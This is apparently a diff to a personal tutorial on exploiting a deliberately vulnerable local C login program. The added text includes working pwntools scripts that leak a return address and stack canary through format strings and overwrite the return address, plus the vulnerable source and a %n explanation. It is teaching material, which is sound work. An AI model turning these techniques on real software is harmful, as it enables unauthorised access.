@@ -321,7 +321,7 @@ But in the third `printf`
 We can see the adress written to `rdi` is relative to `rbp` which means its clearly on the stack and its the address of the `username` variable.
 
 
-### Exploit 1: Leak the Stack Adresses and Relace the Return Address of `AuthenticateUser` to `grantAccess`
+### Exploit 1: Leak the Stack Adresses and Replace the Return Address of `AuthenticateUser` to `grantAccess`
 
 Let's visualize the stack layout:
 
@@ -502,4 +502,493 @@ Enter password for: 0x5a45b5b602cb
 
 This will directly take us to the 11th parameter.
 
-### Building the Payload for Buffer Overflow
+#### Building the Payload for Buffer Overflow
+
+Let's consider this execution
+
+```bash
+$ ./vuln
+Enter Username: %11$p
+Enter password for: 0x5a45b5b602cb
+```
+
+From our earlier calculation we deduced that the address of `grantAccess` is 290 bytes below the address of return address to main. Using that we can do `0x5a45b5b602cb + 0x122 = 0x0x5a45b5b603ed`
+
+But the problem is we cannot send a raw bytestring as input from `stdin`. Because the ascii representation of some of these bytes are not even printable. So we pass it using script. 
+
+```python
+from pwn import *
+import re
+
+print("[*] Launching process")
+p = process("./vuln", stdin=PTY, stdout=PTY)
+
+print("[*] Waiting for 'Enter Username:'")
+data = p.recvuntil(b"Enter Username: ", timeout=2)
+print(f"[DEBUG] Received so far:\n{data}")
+
+print("[*] Sending format string")
+p.sendline(b"%11$p")
+
+print("[*] Waiting for 'Enter password for:'")
+data = p.recvuntil(b"Enter password for: ", timeout=2)
+print(f"[DEBUG] Received so far:\n{data}")
+
+print("[*] Attempting to read leaked pointer")
+leak_line = p.recv(timeout=2)
+print(f"[DEBUG] Raw leak bytes: {leak_line}")
+
+# Try extracting address safely
+m = re.search(rb"0x[0-9a-fA-F]+", leak_line)
+if not m:
+    print("[!] Failed to find leaked address!")
+    p.interactive()
+    exit(1)
+
+leak = int(m.group(0), 16)
+print(f"[+] Leaked return address: {hex(leak)}")
+
+print("[*] Calculating grantAccess")
+grant_access = leak - 0x122
+print(f"[+] grantAccess = {hex(grant_access)}")
+
+print("[*] Building payload")
+payload = b"A"*8 + b"B"*8 + p64(grant_access)
+print(f"[DEBUG] Payload length: {len(payload)}")
+print(f"[DEBUG] Payload bytes: {payload}")
+
+print("[*] Sending password payload")
+p.sendline(payload)
+
+print("[*] Reading remaining output")
+out = p.recvall(timeout=1)
+print(out.decode(errors="ignore"))
+```
+
+```bash
+$ python3 pwn_payload3.py
+[*] Launching process
+[+] Starting local process './vuln' argv=[b'./vuln'] : pid 3536
+[*] Waiting for 'Enter Username:'
+[DEBUG] Received 0x10 bytes:
+    b'Enter Username: '
+[DEBUG] Received so far:
+b'Enter Username: '
+[*] Sending format string
+[DEBUG] Sent 0x6 bytes:
+    b'%11$p\n'
+[*] Waiting for 'Enter password for:'
+[DEBUG] Received 0x22 bytes:
+    b'Enter password for: 0x55bbc51d72cb'
+[DEBUG] Received so far:
+b'Enter password for: '
+[*] Attempting to read leaked pointer
+[DEBUG] Raw leak bytes: b'0x55bbc51d72cb'
+[+] Leaked return address: 0x55bbc51d72cb
+[*] Calculating grantAccess
+[+] grantAccess = 0x55bbc51d71a9
+[*] Building payload
+[DEBUG] Payload length: 24
+[DEBUG] Payload bytes: b'AAAAAAAABBBBBBBB\xa9q\x1d\xc5\xbbU\x00\x00'
+[*] Sending password payload
+[DEBUG] Sent 0x19 bytes:
+    00000000  41 41 41 41  41 41 41 41  42 42 42 42  42 42 42 42  │AAAA│AAAA│BBBB│BBBB│
+    00000010  a9 71 1d c5  bb 55 00 00  0a                        │·q··│·U··│·│
+    00000019
+[*] Reading remaining output
+[+] Receiving all data: Done (37B)
+[DEBUG] Received 0x25 bytes:
+    b'Authentication Failed\n'
+    b'Access Granted\n'
+[*] Stopped process './vuln' (pid 3536)
+Authentication Failed
+Access Granted
+```
+
+This shows that the exploit worked!
+
+### Exploit 2: Buffer Overflow with Stack Canary Enabled
+
+In our previous exploit we disabled stack canary because the buffer overflow will overwrite canary and the program will crash before we execute the code for `grantAccess`. 
+
+Now we will keep the stack canary enabled and achieve the same result. The key to this attack is we can leak the stack canary in the same way we leaked the return address. Then while building the payload, we will make sure that the value of canary gets overwritten with same value, so the canary check won't fail.
+
+For this example, i will change the length of username to 12 bytes, because we need to pass more than 8 bytes of input without overwriting canary. Even though we've defined `username` after `password`, `username` appears on stack first, meaning closer to canary. Compiler is free to reorder local variables on stack, so we can't rely on it. 
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+
+void grantAccess() {
+	printf("Access Granted\n");
+}
+
+void checkPassword(char* password, int *isAuthenticated) {
+
+	if (strcmp(password, "admin123") == 0) {
+		*isAuthenticated = 1;
+	}
+}
+
+
+void AuthenticateUser() {
+	char password[8];
+    char username[12];
+	int  isAuthenticated = 0;
+
+    printf("Enter Username: ");
+	scanf("%s", username);
+
+	printf("Enter password for: ");
+    printf(username);
+	scanf("%s", password);
+
+	checkPassword(password, &isAuthenticated);
+
+	if (isAuthenticated == 1) {
+		grantAccess();
+	} else {
+		printf("Authentication Failed\n");
+	}
+
+}
+
+int main() {
+	AuthenticateUser();
+}
+```
+
+```bash
+$ gcc  -O0 -o vuln_canary  main.c
+main.c: In function ‘AuthenticateUser’:
+main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security]
+   26 |          printf(username);
+      |                 ^~~~~~~~
+```
+
+With `-fstack-protector` (or default GCC settings), the stack frame becomes:
+
+```
+Higher addresses
+┌──────────────────────────┐
+│ Saved RBP                │ ← rbp
+├──────────────────────────┤
+│ Return Address           │ ← rbp+8
+├──────────────────────────┤
+│ Stack Canary (8 bytes)   │ ← rbp-0x8
+├──────────────────────────┤
+│ username[12]             │ ← rbp-0x14
+├──────────────────────────┤
+│ password[8]              │ ← rbp-0x1c
+├──────────────────────────┤
+│ isAuthenticated (4)      │ ← rbp-0x20
+├──────────────────────────┤
+│ padding (4 bytes)        │ ← rbp-0x24 (implicit)
+└──────────────────────────┘
+Lower addresses
+```
+
+Since the return address was at `[rsp+40]` earlier, with this intuition it seems like it should be present at `[rsp+48]` because of 8 byte stack canary added in between. But actually, it will still be at `[rsp+40]` because the space used for padding will be compensated. 
+
+We can verify it from GDB
+
+```bash
+Breakpoint 1, 0x0000555555555226 in AuthenticateUser ()
+(gdb) disass
+Dump of assembler code for function AuthenticateUser:
+   0x000055555555521e <+0>:	endbr64
+   0x0000555555555222 <+4>:	push   rbp
+   0x0000555555555223 <+5>:	mov    rbp,rsp
+=> 0x0000555555555226 <+8>:	sub    rsp,0x20
+   0x000055555555522a <+12>:	mov    rax,QWORD PTR fs:0x28
+   0x0000555555555233 <+21>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000555555555237 <+25>:	xor    eax,eax
+   0x0000555555555239 <+27>:	mov    DWORD PTR [rbp-0x20],0x0
+   0x0000555555555240 <+34>:	lea    rax,[rip+0xdd5]        # 0x55555555601c
+   0x0000555555555247 <+41>:	mov    rdi,rax
+   0x000055555555524a <+44>:	mov    eax,0x0
+```
+
+We can see that the stack size is still 32 bytes from `sub rsp,0x20` which is sill same as earlier. 
+
+But one additional change now is that some lines of code will be added for stack canary as well. So we need to recalculate the offset of `grantAccess`. 
+
+
+```bash
+$ objdump -d -M intel,mnemonic,no-att -j .text vuln_canary
+
+00000000000012fc <main>:
+    12fc:	f3 0f 1e fa          	endbr64
+    1300:	55                   	push   rbp
+    1301:	48 89 e5             	mov    rbp,rsp
+    1304:	b8 00 00 00 00       	mov    eax,0x0
+    1309:	e8 10 ff ff ff       	call   121e <AuthenticateUser>
+    130e:	b8 00 00 00 00       	mov    eax,0x0.  <- return address to main
+    1313:	5d                   	pop    rbp
+    1314:	c3                   	ret
+
+00000000000011c9 <grantAccess>:
+    11c9:	f3 0f 1e fa          	endbr64
+    11cd:	55                   	push   rbp
+    11ce:	48 89 e5             	mov    rbp,rsp
+    11d1:	48 8d 05 2c 0e 00 00 	lea    rax,[rip+0xe2c]        # 2004 <_IO_stdin_used+0x4>
+    11d8:	48 89 c7             	mov    rdi,rax
+    11db:	e8 b0 fe ff ff       	call   1090 <puts@plt>
+    11e0:	90                   	nop
+    11e1:	5d                   	pop    rbp
+    11e2:	c3                   	ret
+```
+
+The return address to main is now `0x130e` and `grantAccess` is at `0x11c9`. So relative offset is `0x130e - 0x11c9 = 0x145` or 325 bytes. 
+
+With the same idea that last 3 nibbles remain same even with ASLR, we need to look for aress ending with `30e` while leaking. 
+
+We can see that stack canary is 16 bytes behind the return address, so it must be at `[rsp+24]`. ANother way to spot stack canary is to look for numbers with last two nibbles as 0's.
+
+#### Why Stack Canary has Last 8 bits set to 0
+
+The stack canary intentionally ends with a zero byte (\x00) to break string-based overflows.
+
+```
+0x77111d362d141300
+                ^^
+               \x00
+```
+
+On x86-64 Linux, the stack canary typically looks like:
+
+```
+[random 7 bytes][00]
+```
+
+**Why the last byte is zero (the real reason)?**
+
+- To stop `strcpy`, `scanf("%s")`, `gets`, etc.
+- Cannot copy a zero byte unless explicitly told to.
+
+So if the canary ends with `\x00`:
+	•	Any string overflow will stop before overwriting the canary
+	•	Or it will overwrite only the first few bytes, not the full value
+	•	Result: canary mismatch → __stack_chk_fail
+
+This defeats accidental and naive overwrites.
+
+#### Leaking the Address
+
+Now can leak 9th and 11th argument for canary and return address respectively
+
+```bash
+$ ./vuln_canary
+Enter Username: %11$p-%9$p
+Enter password for: 0x604f9f2ce30e-0x7fb896f70c86ed00
+```
+
+#### Overflowing the Buffer
+
+Using this information we can build the buffer in this pattern
+
+```
+[ buffer fill up to canary ]
+[ exact 8-byte canary ]
+[ fake saved RBP (8 bytes, anything) ]
+[ new return address (8 bytes) ]
+```
+
+Now we can write a python script using pwntools to exploit this
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+context.binary = "./vuln_canary"
+context.log_level = "debug"
+
+def main():
+    print("[*] Launching process")
+    p = process("./vuln_canary", stdin=PTY, stdout=PTY)
+
+    # -------------------------
+    # Stage 1: Leak
+    # -------------------------
+    print("[*] Waiting for 'Enter Username:'")
+    data = p.recvuntil(b"Enter Username: ", timeout=2)
+    print(f"[DEBUG] Received so far:\n{data}")
+
+    print("[*] Sending format string leak")
+    p.sendline(b"%11$p-%9$p")
+
+    print("[*] Reading leak output")
+    data = p.recvuntil(b"Enter password for: ", timeout=2)
+    data += p.recv(timeout=0.2)   # drain remaining output
+
+    print(f"[DEBUG] Full leak buffer:\n{data}")
+
+    leaks = re.findall(rb"0x[0-9a-fA-F]+", data)
+    if len(leaks) < 2:
+        print("[!] Failed to extract leaks")
+        p.close()
+        return
+
+    ret_addr = int(leaks[0], 16)
+    canary   = int(leaks[1], 16)
+
+    print(f"[+] Leaked return address: {hex(ret_addr)}")
+    print(f"[+] Leaked canary        : {hex(canary)}")
+
+    # -------------------------
+    # Stage 2: Calculate target
+    # -------------------------
+    OFFSET_RET_TO_GRANT = 0x145   # verified earlier
+    grant_access = ret_addr - OFFSET_RET_TO_GRANT
+
+    print(f"[+] Calculated grantAccess: {hex(grant_access)}")
+
+    # -------------------------
+    # Stage 3: Build payload
+    # -------------------------
+    payload  = b"A" * 20          # padding up to canary
+    payload += p64(canary)        # correct canary
+    payload += b"B" * 8           # saved RBP
+    payload += p64(grant_access)  # new return address
+
+    print(f"[DEBUG] Payload length: {len(payload)}")
+    print(f"[DEBUG] Payload bytes: {payload}")
+
+    # -------------------------
+    # Stage 4: Trigger overflow
+    # -------------------------
+    print("[*] Sending password payload")
+    p.sendline(payload)
+
+    # -------------------------
+    # Stage 5: Read result
+    # -------------------------
+    out = p.recvall(timeout=2)
+    print("[*] Program output:")
+    print(out.decode(errors="ignore"))
+
+    if b"Access Granted" in out:
+        print("[+] SUCCESS: Exploit worked")
+    else:
+        print("[-] FAILURE: Exploit did not work")
+
+    p.close()
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+$ python3 pwn_payload_canary2.py
+[*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln_canary'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[*] Launching process
+[+] Starting local process './vuln_canary' argv=[b'./vuln_canary'] : pid 3978
+[*] Waiting for 'Enter Username:'
+[DEBUG] Received 0x10 bytes:
+    b'Enter Username: '
+[DEBUG] Received so far:
+b'Enter Username: '
+[*] Sending format string leak
+[DEBUG] Sent 0xb bytes:
+    b'%11$p-%9$p\n'
+[*] Reading leak output
+[DEBUG] Received 0x35 bytes:
+    b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400'
+[DEBUG] Full leak buffer:
+b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400'
+[+] Leaked return address: 0x60f3fb9c530e
+[+] Leaked canary        : 0xd3be8511a62f4400
+[+] Calculated grantAccess: 0x60f3fb9c51c9
+[DEBUG] Payload length: 44
+[DEBUG] Payload bytes: b'AAAAAAAAAAAAAAAAAAAA\x00D/\xa6\x11\x85\xbe\xd3BBBBBBBB\xc9Q\x9c\xfb\xf3`\x00\x00'
+[*] Sending password payload
+[DEBUG] Sent 0x2d bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    00000010  41 41 41 41  00 44 2f a6  11 85 be d3  42 42 42 42  │AAAA│·D/·│····│BBBB│
+    00000020  42 42 42 42  c9 51 9c fb  f3 60 00 00  0a           │BBBB│·Q··│·`··│·│
+    0000002d
+[+] Receiving all data: Done (37B)
+[DEBUG] Received 0x25 bytes:
+    b'Authentication Failed\n'
+    b'Access Granted\n'
+[*] Process './vuln_canary' stopped with exit code -11 (SIGSEGV) (pid 3978)
+[*] Program output:
+Authentication Failed
+Access Granted
+
+[+] SUCCESS: Exploit worked
+```
+
+
+### Exploit 3: Overwriting the isAuthenticate variable using %n
+
+#### What %n actually does?
+
+In printf-family functions:
+
+```c
+printf("hello%n", &x);
+```
+
+What happens internally
+- printf keeps a counter: “how many characters have I printed so far?”
+- When it sees %n:
+    - It does not print anything
+    - It writes that count into the pointer argument
+
+So if "hello" is printed (5 chars): then x will be 5.
+
+**Variants**
+
+| Specifier | Writes              |
+| --------- | ------------------- |
+| `%n`      | 4 bytes (`int *`)   |
+| `%hn`     | 2 bytes (`short *`) |
+| `%hhn`    | 1 byte (`char *`)   |
+| `%ln`     | 8 bytes (`long *`)  |
+
+**Why %n is dangerous?**
+
+Our vulnerable line:
+
+```c
+printf(username);
+```
+
+You control:
+- the format string
+- which arguments printf thinks exist
+
+That means:
+- You can read arbitrary stack values (%p, %x)
+- You can write to arbitrary addresses (%n)
+
+This is stronger than buffer overflow.
+
+#### Overwriting isAuthenticated variable on Stack
+
+From our earlier stack, `rbp-0x14` → isAuthenticated (int)
+
+So if we can:
+	1.	Find the address of isAuthenticated
+	2.	Pass it as a fake argument to printf
+	3.	Use `%n`
+
+#### How %n arguments work? 
+
+Even though no arguments were passed, printf will:
+	•	walk registers
+	•	then stack
+	•	and use whatever value happens to be there
+
+This is why `%11$p` worked for leaks.
